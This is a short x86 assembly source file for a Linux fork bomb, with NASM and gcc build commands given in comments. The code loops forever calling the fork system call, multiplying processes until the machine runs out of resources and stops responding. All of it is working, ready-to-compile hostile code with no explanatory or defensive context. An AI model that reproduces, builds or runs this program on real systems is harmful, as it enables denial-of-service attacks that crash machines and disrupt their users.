;compile with:
;nasm -f elf32 fork_bomb.asm
;gcc -o fork_bomb fork_bomb.o -m32
section .text
global main
main:
mov eax,2
int 0x80
jmp short main

